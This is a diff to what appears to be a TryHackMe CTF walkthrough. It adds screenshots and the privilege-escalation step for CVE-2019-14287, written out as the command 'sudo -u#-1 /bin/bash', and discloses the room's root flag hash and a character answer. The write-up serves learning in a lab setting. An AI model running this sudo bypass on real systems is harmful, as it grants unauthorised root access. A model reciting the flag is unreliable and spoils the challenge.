@@ -163,36 +163,30 @@ hmm it's an aline image
 
 search with google image and found an acticle about `roswell alien autopsy`
 
-## Privilege Escalation
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1008c877-2458-49f7-9a27-24cac60b754c)
 
-search for privilege escalate
+## Privilege Escalation
 
 ```
 sudo -l -l
 ```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/797796bc-774f-4d8d-af5e-2087193d200d)
 
+search that vulnerabiliy i found a CVE-2019-14287
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/75add10e-7998-4279-aeaa-c8eed44994d1)
 
+and very easy
 
+```
+sudo -u#-1 /bin/bash
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7a9ea7aa-4c9b-4c9a-bf38-11de754f84ff)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+also agent R is `DesKel`
 
 | Flag | root.txt |
 | --- | --- |
-| Answer | <flag> |
+| Answer | b53a02f55b57d4439e3341834d70c062 |
